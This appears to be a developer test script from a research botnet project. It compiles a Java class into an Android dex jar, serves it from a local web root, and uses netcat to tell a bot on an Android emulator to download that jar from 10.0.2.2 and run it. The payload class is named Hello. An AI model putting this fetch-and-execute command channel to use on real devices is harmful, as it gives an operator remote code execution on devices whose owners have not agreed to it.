
echo "redir add tcp:8081:8080" | nc localhost 5554

rm de/tudarmstadt/botnet/janus_yanai/*.class class.jar dexed.jar /var/www/dexed.jar
javac -cp  ~/Desktop/android-sdk-linux_x86/platforms/android-10/android.jar de/tudarmstadt/botnet/janus_yanai/*
jar cf class.jar de
~/Desktop/android-sdk-linux_x86/platform-tools/dx --dex --output dexed.jar class.jar
ln -f dexed.jar /var/www


echo "download http://10.0.2.2/dexed.jar" | nc -vv localhost 8081 &
sleep 3
echo "run de.tudarmstadt.botnet.janus_yanai.Hello" | nc -vv localhost 8081 &
